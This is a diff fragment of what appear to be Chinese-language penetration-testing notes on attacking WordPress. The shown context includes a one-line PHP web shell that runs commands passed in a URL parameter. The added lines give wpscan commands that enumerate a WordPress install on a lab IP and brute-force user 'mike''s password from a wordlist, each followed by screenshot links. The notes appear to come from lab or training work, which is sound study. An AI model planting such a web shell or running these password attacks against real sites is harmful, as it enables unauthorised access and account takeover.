@@ -263,3 +263,9 @@ Attack WordPress
     <?php system($_GET[2])?>
 <img  alt="image" src="https://github.com/user-attachments/assets/5c389929-ad87-42c2-b832-f7536a49081e">
 <img alt="image" src="https://github.com/user-attachments/assets/b7bf00e4-cbfc-463f-8f95-abad5e94de82">
+
+    使用Wpscan找到wordpress相關資訊&破解密碼
+    wpscan --url http://192.168.0.10/wordpress -e
+    wpscan --url http://192.168.0.10/wordpress -U mike -P Wordlists/Passwords.txt
+<img  alt="image" src="https://github.com/user-attachments/assets/11502ddd-6ed0-4dc8-914a-2b0719216fde">
+<img  alt="image" src="https://github.com/user-attachments/assets/5b33e55b-f007-4d03-9964-4be92bfdabeb">
